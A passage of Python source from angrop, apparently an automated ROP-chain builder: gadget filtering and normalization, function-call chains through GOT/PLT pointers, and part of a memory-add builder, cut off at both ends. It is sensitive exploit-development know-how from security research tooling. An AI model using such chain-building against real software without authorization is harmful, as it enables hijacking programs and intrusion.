                    stack_patchs.append((state.regs.sp+idx*arch_bytes, val.data))
                state.solver.add(*st.solver.constraints)
                # when we import constraints, it is possible some of the constraints are associated with initial
                # register value now stitch them together, only the ones being used though
                st_vars = st.solver._solver.variables
                used_regs = {x.split('-')[0].split('_')[-1] for x in st_vars if x.startswith('sreg_')}
                for reg in used_regs:
                    state.solver.add(state.registers.load(reg) == st.registers.load(reg))
            else:
                raise ValueError("huh?")

            # step following the trace
            for addr in gadget.bbl_addrs[1:]:
                succ = state.step()
                succ_states = [
                    state
                    for state in succ.successors
                    if state.solver.is_true(state.ip == addr)
                ]
                if len(succ_states) != 1:
                    raise RopException(
                        "Zero or multiple states match address of next block"
                    )
                state = succ_states[0]
            succ = state.step()
            if succ.flat_successors or len(succ.unconstrained_successors) != 1:
                raise RopException(
                    "Executing gadget doesn't result in a single unconstrained state"
                )
            state = succ.unconstrained_successors[0]

        if len(state.solver.eval_to_ast(state.ip, 2)) < 2:
            raise RopException("The final pc is not unconstrained!")

        # Record the variable that controls the final ip.
        next_pc_val = rop_utils.cast_rop_value(
            test_symbolic_state.solver.BVS("next_pc", self.project.arch.bits),
            self.project,
        )
        map_stack_var(state.ip, next_pc_val)

        # Constrain final register values.
        for reg, val in register_dict.items():
            var = state.registers.load(reg)
            if val.is_register:
                if var.op != "BVS" or not next(iter(var.variables)).startswith(
                    f"sreg_{val.reg_name}-"
                ):
                    raise RopException("Register wasn't moved correctly")
            elif not var.symbolic and not val.symbolic:
                if var.concrete_value != val.concreted:
                    raise RopException("Register set to incorrect value")
            else:
                state.solver.add(var == val.data)
                lhs, rhs = self._rebalance_ast(var, val.data)
                if self.project.arch.memory_endness == 'Iend_LE':
                    rhs = claripy.Reverse(rhs)
                ropvalue = val.copy()
                if val.rebase:
                    ropvalue._value = rhs - ropvalue._code_base
                else:
                    ropvalue._value = rhs
                map_stack_var(lhs, ropvalue)

        # Constrain memory access addresses.
        for action in state.history.actions:
            if action.type == action.MEM and action.addr.symbolic:
                if len(state.solver.eval_to_ast(action.addr, 2)) == 1:
                    continue
                addr_vars = action.addr.ast.variables
                if len(addr_vars) == 1 and set(addr_vars).pop().startswith("symbolic_stack"):
                    if constrained_addrs is not None:
                        ptr_bv = constrained_addrs[0]
                        constrained_addrs = constrained_addrs[1:]
                    else:
                        ptr_bv = claripy.BVV(self._get_ptr_to_writable(action.size.ast//8), action.addr.ast.size())
                    ropvalue = rop_utils.cast_rop_value(ptr_bv, self.project)
                    lhs, rhs = self._rebalance_ast(action.addr.ast, ptr_bv)
                    if self.project.arch.memory_endness == 'Iend_LE':
                        rhs = claripy.Reverse(rhs)
                    if ropvalue.rebase:
                        ropvalue._value = rhs - ropvalue._code_base
                    else:
                        ropvalue._value = rhs
                    map_stack_var(lhs, ropvalue)

        # now import the constraints from the state that has reached the end of the ropchain
        test_symbolic_state.solver.add(*state.solver.constraints)

        # now import the stack patchs
        for addr, data in stack_patchs:
            test_symbolic_state.memory.store(addr, data, endness=self.project.arch.memory_endness)

        bytes_per_pop = arch_bytes

        # constrain the "filler" values
        if self.roparg_filler is not None:
            for offset in range(0, total_sc, bytes_per_pop):
                sym_word = test_symbolic_state.stack_read(offset, bytes_per_pop)
                # check if we can constrain val to be the roparg_filler
                if test_symbolic_state.solver.satisfiable([sym_word == self.roparg_filler]):
                    # constrain the val to be the roparg_filler
                    test_symbolic_state.add_constraints(sym_word == self.roparg_filler)

        # create the ropchain
        chain = RopChain(self.project,
                         self,
                         state=test_symbolic_state.copy(),
                         badbytes=self.badbytes)

        # iterate through the stack values that need to be in the chain
        if not chain._blank_state.satisfiable():
            raise RopException("the chain is not feasible!")

        for offset in range(-bytes_per_pop, total_sc, bytes_per_pop):
            sym_word = test_symbolic_state.stack_read(offset, bytes_per_pop)
            assert len(sym_word.variables) <= 1
            if not sym_word.variables:
                chain.add_value(sym_word)
                continue

            sym_var = next(iter(sym_word.variables))
            if sym_var in stack_var_to_value:
                val = stack_var_to_value[sym_var]
                if isinstance(val, RopGadget):
                    # this is special, we know this won't be "next_pc", so don't try
                    # to take "next_pc"'s position
                    value = RopValue(val.addr, self.project)
                    value.rebase_analysis(chain=chain)
                    chain.add_value(value)
                elif isinstance(val, RopBlock):
                    chain.add_value(val._values[0])
                else:
                    chain.add_value(val)
            else:
                chain.add_value(sym_word)

        # expand mixins to plain gadgets
        plain_gadgets = []
        for g in gadgets:
            if isinstance(g, RopGadget):
                plain_gadgets.append(g)
            elif isinstance(g, RopBlock):
                plain_gadgets += g._gadgets
            else:
                raise RuntimeError("???")
        chain.set_gadgets(plain_gadgets)

        return chain

    def _get_fill_val(self):
        if self.roparg_filler is not None:
            return self.roparg_filler
        else:
            return claripy.BVS("filler", self.project.arch.bits)

    @abstractmethod
    def _effect_tuple(self, g):
        raise NotImplementedError("_effect_tuple is not implemented!")

    @abstractmethod
    def _comparison_tuple(self, g):
        raise NotImplementedError("_comparison_tuple is not implemented!")

    def __filter_gadgets(self, gadgets):
        """
        group gadgets by features and drop lesser groups
        """
        # gadget grouping
        d = defaultdict(list)
        for g in gadgets:
            key = self._comparison_tuple(g)
            d[key].append(g)
        if len(d) == 0:
            return set()
        if len(d) == 1:
            return {gadgets.pop()}

        # only keep the best groups
        keys = set(d.keys())
        bests = set()
        while keys:
            k1 = keys.pop()
            # check if nothing is better than k1
            for k2 in bests|keys:
                # if k2 is better than k1
                if all(k2[i] <= k1[i] for i in range(len(key))): # type:ignore
                    break
            else:
                bests.add(k1)

        # turn groups back to gadgets
        gadgets = set()
        for key, val in d.items():
            if key not in bests:
                continue
            gadgets = gadgets.union(val)
        return gadgets

    def _filter_gadgets(self, gadgets):
        """
        process gadgets based on their effects
        exclude gadgets that do symbolic memory access
        """
        bests = set()
        equal_classes = defaultdict(set)
        for g in gadgets:
            equal_classes[self._effect_tuple(g)].add(g)
        for _, equal_class in equal_classes.items():
            bests = bests.union(self.__filter_gadgets(equal_class))
        return bests

    @staticmethod
    def _mixins_to_gadgets(mixins):
        """
        simply expand all ropblocks to gadgets
        """
        gadgets = []
        for mixin in mixins:
            if isinstance(mixin, RopGadget):
                gadgets.append(mixin)
            elif isinstance(mixin, RopBlock):
                gadgets += mixin._gadgets
            else:
                raise ValueError(f"cannot turn {mixin} into RopBlock!")
        return gadgets

    @abstractmethod
    def bootstrap(self):
        """
        update the builder based on current gadgets to bootstrap a functional builder
        """
        raise NotImplementedError("each Builder class should have an `update` method!")

    @abstractmethod
    def optimize(self, processes):
        """
        improve the capability of this builder using other builders
        """
        cls_name = self.__class__.__name__
        raise NotImplementedError(f"`advanced_update` is not implemented for {cls_name}!")

    def _normalize_conditional(self, gadget, preserve_regs=None):
        if preserve_regs is None:
            preserve_regs = set()

        registers = {}
        for reg in gadget.branch_dependencies:
            var = claripy.BVS(f"bvar_{reg}", self.project.arch.bits)
            registers[reg] = var
        try:
            chain = self.set_regs(preserve_regs=preserve_regs, **registers)
        except RopException:
            return None
        gadgets = chain._gadgets
        return gadgets

    def _normalize_jmp_reg(self, gadget, pre_preserve=None, to_set_regs=None):
        if pre_preserve is None:
            pre_preserve = set()
        if to_set_regs is None:
            to_set_regs = set()
        reg_setter = self.chain_builder._reg_setter
        if not reg_setter.can_set_reg(gadget.pc_reg):
            return None
        if gadget.pc_reg in pre_preserve or gadget.pc_reg in to_set_regs:
            return None

        # choose the best gadget to set the PC for this jmp_reg gadget
        for pc_setter in reg_setter._reg_setting_dict[gadget.pc_reg]:
            if pc_setter.has_symbolic_access():
                continue
            if pc_setter.changed_regs.intersection(pre_preserve):
                continue
            total_sc = gadget.stack_change + pc_setter.stack_change
            gadgets = reg_setter._mixins_to_gadgets([pc_setter, gadget])
            try:
                chain = reg_setter._build_reg_setting_chain(gadgets, {})
                rb = RopBlock.from_chain(chain)

                # TODO: technically, we should support chains like:
                # pop rax; add eax, 0x1000; ret + <useful stuff>; call rax;
                # but I'm too lazy to implement it atm
                _, final_state = rb.sim_exec()
                if final_state.ip.depth > 1:
                    continue
                assert rb.stack_change == total_sc
                return rb._gadgets[:-1]
            except RopException:
                pass
        return None

    def _normalize_jmp_mem(self, gadget, pre_preserve=None, post_preserve=None):
        if not self.chain_builder._can_do_write:
            return None
        if pre_preserve is None:
            pre_preserve = set()
        if post_preserve is None:
            post_preserve = set()

        # calculate the number of bytes we need to shift after jmp_mem
        # this handles out of patch access
        mem_writer = self.chain_builder._mem_writer
        stack_offsets = []
        for m in gadget.mem_reads + gadget.mem_writes + gadget.mem_changes:
            if m.stack_offset is not None:
                stack_offsets.append(m.stack_offset + self.project.arch.bytes)
        if stack_offsets:
            shift_size = max(stack_offsets) - gadget.stack_change
        else:
            shift_size = self.project.arch.bytes

        # make sure we can set the pc_target ast in the first place
        needed_regs = set(x[5:].split('-', 1)[0] for x in gadget.pc_target.variables if x.startswith('sreg_'))
        reg_setter = self.chain_builder._reg_setter
        for reg in needed_regs:
            if not reg_setter.can_set_reg(reg):
                return None

        # if the target is not symbolic, make sure the target location is writable
        if not gadget.pc_target.symbolic:
            seg = self.project.loader.find_segment_containing(gadget.pc_target.concrete_value)
            if not seg or not seg.is_writable:
                return None

        try:
            # step1: find a shifter that clean up the jmp_mem call
            sc = abs(gadget.stack_change) + self.project.arch.bytes
            shifter = None
            # find the smallest shifter
            shift_gadgets = self.chain_builder._shifter.shift_gadgets
            keys = sorted(shift_gadgets.keys())
            shifter_list = [shift_gadgets[x] for x in keys if x >= sc]
            if not shifter_list:
                return None
            shifter_list = itertools.chain.from_iterable(shifter_list)
            for shifter in shifter_list:
                if shifter.pc_offset < shift_size:
                    continue
                if not shifter.changed_regs.intersection(post_preserve):
                    break
            else:
                return None
            assert shifter.transit_type == 'pop_pc'

            # step2: write the shifter to a writable location
            data = struct.pack(self.project.arch.struct_fmt(), shifter.addr)
            if gadget.pc_target.symbolic:
                ptr = self._get_ptr_to_writable(self.project.arch.bytes)
                # we ensure the content it points to is zeroed out, so we don't need to write trailing 0s
                # but we can't do so for GOT because they may have leftovers there
                data = data.rstrip(b'\x00')
            else:
                ptr = gadget.pc_target.concrete_value
            ptr_val = rop_utils.cast_rop_value(ptr, self.project)
            chain = mem_writer.write_to_mem(ptr_val, data, fill_byte=b'\x00', preserve_regs=pre_preserve)
            rb = RopBlock.from_chain(chain)
            state = rb._blank_state

            # step3: identify the registers that we can't fully control yet in pc_target, then set them using RegSetter
            _, final_state = rb.sim_exec()
            try:
                reg_solves, stack_solves = self._solve_ast_constraint(gadget.pc_target, ptr)
            except claripy.errors.UnsatError: # type: ignore
                return None
            to_set_regs = {x:y for x,y in reg_solves.items() if x not in rb.popped_regs}
            preserve_regs = set(reg_solves.keys()) - set(to_set_regs.keys())
            if any(x for x in to_set_regs if not self.chain_builder._reg_setter.can_set_reg(x)):
                return None
            if preserve_regs:
                for reg in preserve_regs:
                    rb._blank_state.solver.add(final_state.registers.load(reg) == reg_solves[reg])
            if to_set_regs:
                chain = self.set_regs(**to_set_regs, preserve_regs=preserve_regs.union(pre_preserve))
                rb += RopBlock.from_chain(chain)

            # step4: chain it with the jmp_mem gadget
            # note that rb2 here is actually the gadget+shifter
            # but shifter is written into memory, so ignore it when building rb2
            rb2 = RopBlock(self.project, self)
            value = RopValue(gadget.addr, self.project)
            value.rebase_analysis(chain=chain)
            rb2.add_value(value)

            sc = shifter.stack_change + gadget.stack_change
            state = rb2._blank_state
            for offset in range(0, sc, self.project.arch.bytes):
                if offset == shifter.pc_offset + gadget.stack_change:
                    val = state.solver.BVS("next_pc", self.project.arch.bits)
                else:
                    # FIXME: currently, the endness handling is a mess. Need to rewrite this part in a uniformed way
                    # the following code is a compromise to the mess
                    arch_bytes = self.project.arch.bytes
                    idx = (rb.stack_change + offset)//arch_bytes
                    data = claripy.BVS(f"symbolic_stack_{idx}", self.project.arch.bits)
                    state.memory.store(state.regs.sp+rb.stack_change+offset, data)
                    addr = state.regs.sp+rb.stack_change+offset
                    val = state.memory.load(addr, arch_bytes, endness=self.project.arch.memory_endness)
                rb2.add_value(val)
            rb2.set_gadgets([gadget])
            for offset, val in stack_solves.items():
                # +1 because we insert a gadget before the stack patch
                rb2._values[offset+1] = rop_utils.cast_rop_value(val, self.project)

            rb += rb2
            return rb
        except (RopException, IndexError):
            return None

    def normalize_gadget(self, gadget, pre_preserve=None, post_preserve=None, to_set_regs=None):
        """
        pre_preserve: what registers to preserve before executing the gadget
        post_preserve: what registers to preserve after executing the gadget
        """
        try:
            gadgets = [gadget]

            if pre_preserve is None:
                pre_preserve = set()
            if post_preserve is None:
                post_preserve = set()
            m = None

            # filter out gadgets with too many symbolic access
            if gadget.num_sym_mem_access > 1:
                return None

            # TODO: don't support these yet
            if gadget.transit_type == 'jmp_mem':
                if gadget.has_conditional_branch or gadget.has_symbolic_access():
                    return None

            # at this point, we know for sure all gadget symbolic accesses should be normalized
            # because they can't be jmp_mem gadgets
            if gadget.has_symbolic_access():
                mem_accesses = gadget.mem_reads + gadget.mem_writes + gadget.mem_changes
                sim_accesses = [x for x in mem_accesses if x.is_symbolic_access()]
                assert len(sim_accesses) == 1, hex(gadget.addr)
                m = sim_accesses[0]
                pre_preserve = pre_preserve.union(m.addr_controllers)

            # normalize conditional branches
            if gadget.has_conditional_branch:
                tmp = self._normalize_conditional(gadget, preserve_regs=pre_preserve)
                if tmp is None:
                    return None
                gadgets = tmp + gadgets

            # normalize transit_types
            if gadget.transit_type == 'jmp_reg':
                tmp = self._normalize_jmp_reg(gadget, pre_preserve=pre_preserve, to_set_regs=to_set_regs)
                if tmp is None:
                    return None
                gadgets = tmp + gadgets
            elif gadget.transit_type == 'jmp_mem':
                rb = self._normalize_jmp_mem(gadget, pre_preserve=pre_preserve, post_preserve=post_preserve)
                return rb
            elif gadget.transit_type == 'pop_pc':
                pass
            else:
                raise NotImplementedError()

            chain = self._build_reg_setting_chain(gadgets, {})
            rb = RopBlock.from_chain(chain)

            if rb is None:
                return None

            # normalize non-positive stack_change
            if gadget.stack_change <= 0:
                shift_gadgets = self.chain_builder._shifter.shift_gadgets
                sc = abs(gadget.stack_change) + self.project.arch.bytes
                keys = sorted(shift_gadgets.keys())
                shifter_list = [shift_gadgets[x] for x in keys if x >= sc]
                shifter_list = itertools.chain.from_iterable(shifter_list)
                max_stack_offset = gadget.max_stack_offset
                for shifter in shifter_list:
                    if shifter.pc_offset < abs(gadget.stack_change) + max_stack_offset + self.project.arch.bytes:
                        continue
                    if shifter.changed_regs.intersection(post_preserve):
                        continue
                    try:
                        chain = self._build_reg_setting_chain([rb, shifter], {})
                        rb = RopBlock.from_chain(chain)
                        break
                    except RopException:
                        pass
                else:
                    return None

            if rb is None:
                return None

            # handle cases where the ropblock has out_of_patch accesses
            # the solution is to shift the stack to contain the accesses
            # FIXME: currently, we allow bytes*2 more bytes in shifting because of the mismatch on how
            # stack_max_offset is calculated in ropblock and ropgadget
            if rb.oop:
                shift_gadgets = self.chain_builder._shifter.shift_gadgets
                keys = sorted(shift_gadgets.keys())
                shifter_list = itertools.chain.from_iterable([shift_gadgets[k] for k in keys])
                for shifter in shifter_list:
                    if shifter.stack_change + rb.stack_change <= rb.max_stack_offset:
                        continue
                    if shifter.pc_offset == rb.max_stack_offset - rb.stack_change:
                        continue
                    try:
                        chain = self._build_reg_setting_chain([rb, shifter], {})
                        rb = RopBlock.from_chain(chain)
                        rb._values = rb._values[:rb.stack_change//self.project.arch.bytes+1]
                        rb.payload_len = len(rb._values) * self.project.arch.bytes
                        break
                    except RopException:
                        pass
                else:
                    return None

            # constrain memory accesses
            if m is not None:
                request = {}
                for reg in m.addr_controllers:
                    data = claripy.BVS('sym_addr', self.project.arch.bits)
                    request[reg] = data
                if request:
                    tmp = self.set_regs(**request)
                    tmp = RopBlock.from_chain(tmp)
                    _, final_state = tmp.sim_exec()
                    st = rb._blank_state
                    for reg in m.addr_controllers:
                        tmp._blank_state.solver.add(final_state.registers.load(reg) == st.registers.load(reg))
                    rb = tmp + rb
                else: # TODO:we currently don't support symbolizing address popped from stack
                    return None
                return rb

            return rb
        except (RopException, angr.errors.SimSolverModeError):
            return None

```

`angrop/chain_builder/func_caller.py`:

```py
import struct
import logging

import angr
import claripy
from angr.calling_conventions import SimRegArg, SimStackArg

from .builder import Builder
from .. import rop_utils
from ..errors import RopException
from ..rop_gadget import FunctionGadget

l = logging.getLogger(__name__)

class FuncCaller(Builder):
    """
    handle function calls by automatically detecting the target binary's
    calling convention
    thanks to @tomgond for a great portion of this class
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)
        # invoke a function but cannot maintain the control flow afterwards (pop rdi; jmp rax)
        self._func_jmp_gadgets = None
        # invoke a function and still maintain the control flow afterwards (call rax; ret)
        # TODO: currently not supported
        self._func_call_gadgets = None
        # record the calling convention
        self._cc = angr.default_cc(
                            self.project.arch.name,
                            platform=self.project.simos.name if self.project.simos is not None else None,
                            )(self.project.arch) # type:ignore

    def bootstrap(self):
        cc = self._cc
        self._func_jmp_gadgets = set()
        for g in self.chain_builder.gadgets:
            if g.self_contained:
                continue
            if g.popped_regs.intersection(cc.ARG_REGS):
                self._func_jmp_gadgets.add(g)
                continue
            for move in g.reg_moves:
                if move.to_reg in cc.ARG_REGS:
                    self._func_jmp_gadgets.add(g)
                    break

    def _find_function_pointer_in_got_plt(self, func_addr):
        """
        Search if a func addr is in plt. If it's in plt, find func name and
        translate it to GOT so that we can directly call/jmp to the location pointed there.
        """
        # Search GOT and PLT across all loaded objects
        func_name = None
        for sym in self.project.loader.main_object.symbols:
            if sym.rebased_addr == func_addr:
                func_name = sym.name

        for sym, val in self.project.loader.main_object.plt.items():
            if val == func_addr:
                func_name = sym
        # addr is found in plt. we look for this symbol in got
        if func_name:
            func_got = self.project.loader.main_object.imports.get(func_name)
            if func_got:
                return func_got.rebased_addr
            else:
                # this is from plt but not in got somehow
                return None
        # not in plt. We can search in other ways
        else:
            return None

    def _find_function_pointer(self, func_addr):
        """Find pointer to function, allowing for potential memory locations"""
        # Existing GOT/PLT search logic first
        got_ptr = self._find_function_pointer_in_got_plt(func_addr)
        if got_ptr is not None:
            return got_ptr

        # Broader search strategy
        func_ptr_bytes = struct.pack(self.project.arch.struct_fmt(), func_addr)
        for seg in self.project.loader.main_object.segments:
            if not seg.is_readable:
                continue
            if not seg.memsize:
                continue

            # Scan segments for potential pointers
            sec_data = self.project.loader.memory.load(seg.min_addr, seg.memsize)
            offset = sec_data.find(func_ptr_bytes)
            if offset == -1:
                continue
            return seg.min_addr + offset
        return None

    def _func_call(self, func_gadget, cc, args, extra_regs=None, preserve_regs=None,
                   needs_return=True, jmp_mem_target=None, **kwargs):
        """
        func_gadget: the address of the function to invoke
        cc: calling convention
        args: the arguments to the function
        extra_regs: what extra registers to set besides the function arguments, useful for invoking system calls
        preserve_res: what registers preserve
        needs_return: whether we need to cleanup stack after the function invocation,
            setting this to False will result in a shorter chain
        """
        assert type(args) in [list, tuple], "function arguments must be a list or tuple!"
        if kwargs:
            l.warning("passing deprecated arguments %s to angrop.chain_builder.FuncCaller", kwargs)

        preserve_regs = set(preserve_regs) if preserve_regs else set()
        arch_bytes = self.project.arch.bytes

        # distinguish register and stack arguments
        register_arguments = args
        stack_arguments = []
        if len(args) > len(cc.ARG_REGS):
            register_arguments = args[:len(cc.ARG_REGS)]
            stack_arguments = args[len(cc.ARG_REGS):]

        # set register arguments
        if needs_return and isinstance(cc.RETURN_ADDR, SimRegArg) and cc.RETURN_ADDR.reg_name != 'ip_at_syscall':
            reg_name = cc.RETURN_ADDR.reg_name
            preserve_regs.add(reg_name)
        registers = {} if extra_regs is None else extra_regs
        for arg, reg in zip(register_arguments, cc.ARG_REGS):
            registers[reg] = arg
        for reg in preserve_regs:
            registers.pop(reg, None)

        # if this is a simple function call, just set the registers and invoke it
        if not jmp_mem_target:
            chain = self.chain_builder.set_regs(**registers, preserve_regs=preserve_regs)
        else:
            # this is a jmp_mem function call, we need to constrain the jmp_mem target
            rop_values, constraints = self._build_ast_constraints(func_gadget.pc_target)
            registers.update(rop_values)
            chain = self.chain_builder.set_regs(**registers, preserve_regs=preserve_regs)
            state = chain._blank_state
            state.solver.add(claripy.And(*constraints))
            state.solver.add(jmp_mem_target == func_gadget.pc_target)

        # invoke the function
        chain.add_gadget(func_gadget)
        for delta in range(func_gadget.stack_change//arch_bytes):
            if func_gadget.pc_offset is None or delta != func_gadget.pc_offset:
                chain.add_value(self._get_fill_val())
            else:
                chain.add_value(claripy.BVS("next_pc", self.project.arch.bits))

        # we are done here if we don't need to return
        if not needs_return:
            return chain

        # now we need to cleanly finish the calling convention
        # 1. handle stack arguments
        # 2. handle function return address to maintain the control flow
        if stack_arguments:
            shift_bytes = (len(stack_arguments)+1)*arch_bytes
            # TODO: currently, we only shift stack only for the minimal
            # but if this shift fails, we should try larger shifts
            cleaner = self.chain_builder.shift(shift_bytes, next_pc_idx=-1, preserve_regs=preserve_regs)
            chain.add_gadget(cleaner._gadgets[0])
            for arg in stack_arguments:
                chain.add_value(arg)
            next_pc = claripy.BVS("next_pc", self.project.arch.bits)
            chain.add_value(next_pc)

        # handle return address
        if not isinstance(cc.RETURN_ADDR, (SimStackArg, SimRegArg)):
            raise RopException(f"What is the calling convention {cc} I'm dealing with?")
        if isinstance(cc.RETURN_ADDR, SimRegArg) and cc.RETURN_ADDR.reg_name != 'ip_at_syscall':
            # now we know this function will return to a specific register
            # so we need to set the return address before invoking the function
            reg_name = cc.RETURN_ADDR.reg_name
            shifter = self.chain_builder._shifter.shift(self.project.arch.bytes)
            next_ip = rop_utils.cast_rop_value(shifter._gadgets[0].addr, self.project)
            pre_chain = self.chain_builder.set_regs(**{reg_name: next_ip})
            chain = pre_chain + chain
        return chain

    def func_call(self, address, args, **kwargs):
        """
        :param address: address or name of function to call
        :param args: a list/tuple of arguments to the function
        :param preserve_regs: list of registers which shouldn't be set
        :param needs_return: whether to continue the ROP after invoking the function
        :return: a RopChain which invokes the function with the arguments
        """
        symbol = None
        # is it a symbol?
        if isinstance(address, str):
            symbol = address
            symobj = self.project.loader.main_object.get_symbol(symbol)
            if hasattr(self.project.loader.main_object, 'plt') and address in self.project.loader.main_object.plt:
                address = self.project.loader.main_object.plt[symbol]
            elif symobj is not None:
                address = symobj.rebased_addr
            else:
                raise RopException("Symbol passed to func_call does not exist in the binary")

        # try to invoke the function using all self-contained gadgets
        func_gadget = FunctionGadget(address, symbol)
        func_gadget.stack_change = self.project.arch.bytes
        func_gadget.pc_offset = 0
        try:
            return self._func_call(func_gadget, self._cc, args, **kwargs)
        except RopException:
            pass

        # well, let's try non-self-contained gadgets, but this time, we don't guarantee returns
        needs_return = kwargs.get("needs_return", None)
        if needs_return:
            raise RopException("fail to invoke function and return using all self-contained gadgets")
        if needs_return is None:
            s = symbol if symbol else hex(address)
            l.warning("function %s won't return!", s)
            kwargs['needs_return'] = False

        # try func_jmp_gadgets
        register_args = args[:len(self._cc.ARG_REGS)]
        registers = {self._cc.ARG_REGS[i]:register_args[i] for i in range(len(register_args))}
        reg_names = set(registers.keys())
        ptr_to_func = self._find_function_pointer(address)
        hard_regs = [x for x in registers if not self.chain_builder._reg_setter.can_set_reg(x)]
        if ptr_to_func is not None:
            for g in self._func_jmp_gadgets: # type:ignore
                if g.popped_regs.intersection(reg_names):
                    l.warning("do not support func_jmp_gadgets that have pops: %s", g.dstr())
                    continue

                # build the new target registers
                registers = registers.copy()
                skip = False
                for move in g.reg_moves:
                    if move.from_reg in hard_regs or move.to_reg not in hard_regs:
                        skip = True
                        break
                    if move.to_reg in registers.keys():
                        val = registers[move.to_reg]
                        if move.from_reg in registers:
                            l.warning("oops, overlapped moves not handled atm: %s", g.dstr())
                            skip = True
                            break
                        del registers[move.to_reg]
                        registers[move.from_reg] = val
                if skip:
                    continue

                if g.transit_type != 'jmp_mem':
                    raise NotImplementedError("currently only support jmp_mem type func_jmp_gadgets!")
                #func_gadget.stack_change = self.project.arch.bytes
                #func_gadget.pc_offset = 0
                # try to invoke the function using the new target registers
                try:
                    return self._func_call(g, self._cc, [], extra_regs=registers,
                                           jmp_mem_target=ptr_to_func, **kwargs)
                except RopException:
                    pass

        s = symbol if symbol else hex(address)
        raise RopException(f"fail to invoke function: {s}")

```

`angrop/chain_builder/mem_changer.py`:

```py
import logging
from functools import cmp_to_key

import claripy
import angr

from .builder import Builder
from .. import rop_utils
from ..rop_block import RopBlock
from ..rop_gadget import RopGadget
from ..errors import RopException

l = logging.getLogger(__name__)

class MemChanger(Builder):
    """
    part of angrop's chainbuilder engine, responsible for adding values to a memory location
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)
        self._mem_change_gadgets: list[RopGadget] = None # type: ignore
        self._mem_add_gadgets: list[RopGadget] = None # type: ignore

    def bootstrap(self):
        self._mem_change_gadgets = self._get_all_mem_change_gadgets(self.chain_builder.gadgets)
        self._mem_add_gadgets = self._get_all_mem_add_gadgets()

    def verify(self, chain, addr, value, _):
        arch_bytes = self.project.arch.bytes
        endness = self.project.arch.memory_endness

        # verify the chain actually works
        chain2 = chain.copy()
        chain2._blank_state.memory.store(addr.data, 0x41424344, arch_bytes, endness=endness)
        state = chain2.exec()
        sim_data = state.memory.load(addr.data, arch_bytes, endness=endness)
        if not state.solver.eval(sim_data == 0x41424344 + value.data):
            raise RopException("memory add fails - 1")
        # the next pc must come from the stack
        if len(state.regs.pc.variables) != 1:
            raise RopException("memory add fails - 2")
        if not set(state.regs.pc.variables).pop().startswith("next_pc_"):
            raise RopException("memory add fails - 3")

    def _effect_tuple(self, g):
        change = g.mem_changes[0]
        v1 = change.op
        v2 = change.data_size
        v3 = change.data_constant
        v4 = tuple(sorted(change.addr_dependencies))
        v5 = tuple(sorted(change.data_dependencies))
        return (v1, v2, v3, v4, v5)

    def _comparison_tuple(self, g):
        return (len(g.changed_regs), g.stack_change, g.num_sym_mem_access,
                rop_utils.transit_num(g), g.isn_count)

    def _get_all_mem_change_gadgets(self, gadgets):
        possible_gadgets = set()
        for g in gadgets:
            if not g.self_contained:
                continue
            sym_rw = [m for m in g.mem_reads + g.mem_writes if m.is_symbolic_access()]
            if len(sym_rw) > 0 or len(g.mem_changes) != 1:
                continue
            for m_access in g.mem_changes:
                # assume we need intersection of addr_dependencies and data_dependencies to be 0
                if m_access.addr_controllable() and m_access.data_controllable() and m_access.addr_data_independent():
                    possible_gadgets.add(g)
        gadgets = self._filter_gadgets(possible_gadgets)
        return sorted(gadgets, key=lambda x: x.stack_change)

    def _get_all_mem_add_gadgets(self):
        return [x for x in self._mem_change_gadgets if x.mem_changes[0].op in ('__add__', '__sub__')]

    @staticmethod
    def _sort_gadgets(gadgets):
        def cmp_func(g1, g2):
            # prefer gadget with fewer memory accesses
            if g1.num_sym_mem_access > g2.num_sym_mem_access:
                return 1
            if g1.num_sym_mem_access < g2.num_sym_mem_access:
                return -1
            # prefer gadget taking less space
            if g1.stack_change > g2.stack_change:
                return 1
            elif g1.stack_change < g2.stack_change:
                return -1
            # prefer shorter gadget
            if g1.isn_count > g2.isn_count:
                return 1
            elif g1.isn_count < g2.isn_count:
                return -1
            return 0
        return sorted(gadgets, key=cmp_to_key(cmp_func))

    def add_to_mem(self, addr, value, data_size=None):
        # TODO could allow mem_reads as long as we control the address?

        if data_size is None:
            data_size = self.project.arch.bits

        possible_gadgets = [x for x in self._mem_add_gadgets if x.mem_changes[0].data_size == data_size]
        if not possible_gadgets:
            raise RopException("Fail to find any gadget that can perform memory adding...")

        # sort the gadgets with number of memory accesses and stack_change
        gadgets = self._sort_gadgets(possible_gadgets)

        if not gadgets:
            raise RopException("Couldnt set registers for any memory add gadget")

        l.debug("Now building the mem add chain")

        # try to build the chain
        for g in gadgets:
            try:
                chain = self._add_mem_with_gadget(g, addr, data_size, difference=value)
                self.verify(chain, addr, value, data_size)
                return chain
            except RopException:
                pass

        raise RopException("Fail to perform add_to_mem!")

    def _add_mem_with_gadget(self, gadget, addr, data_size, final_val=None, difference=None):
        # sanity check for simple gadget
        if len(gadget.mem_writes) + len(gadget.mem_changes) != 1 or len(gadget.mem_reads) != 0:
            raise RopException("too many memory accesses for my lazy implementation")

        if (final_val is not None and difference is not None) or (final_val is None and difference is None):
            raise RopException("must specify difference or final value and not both")

        arch_endness = self.project.arch.memory_endness

        # constrain the successor to be at the gadget
        # emulate 'pop pc'
        arch_bytes = self.project.arch.bytes
        test_state = self.make_sim_state(gadget.addr, gadget.stack_change//arch_bytes)

        if difference is not None:
            test_state.memory.store(addr.concreted, claripy.BVV(~(difference.concreted), data_size)) # pylint:disable=invalid-unary-operand-type
        if final_val is not None:
            test_state.memory.store(addr.concreted, claripy.BVV(~final_val, data_size)) # pylint:disable=invalid-unary-operand-type

        # step the gadget
        pre_gadget_state = test_state
        state = rop_utils.step_to_unconstrained_successor(self.project, pre_gadget_state)

        # constrain the change
        mem_change = gadget.mem_changes[0]
        the_action = None
        for a in state.history.actions.hardcopy:
            if a.type != "mem" or a.action != "write":
                continue
            if set(rop_utils.get_ast_dependency(a.addr.ast)) == set(mem_change.addr_dependencies):
                the_action = a
                break

        if the_action is None:
            raise RopException("Couldn't find the matching action")

        # constrain the addr
        test_state.add_constraints(the_action.addr.ast == addr.concreted)
        pre_gadget_state.add_constraints(the_action.addr.ast == addr.concreted)
        pre_gadget_state.options.discard(angr.options.AVOID_MULTIVALUED_WRITES)
        pre_gadget_state.options.discard(angr.options.AVOID_MULTIVALUED_READS)
        state = rop_utils.step_to_unconstrained_successor(self.project, pre_gadget_state)

        # constrain the data
        if final_val is not None:
            test_state.add_constraints(state.memory.load(addr.concreted, data_size//8, endness=arch_endness) ==
                                       claripy.BVV(final_val, data_size))
        if difference is not None:
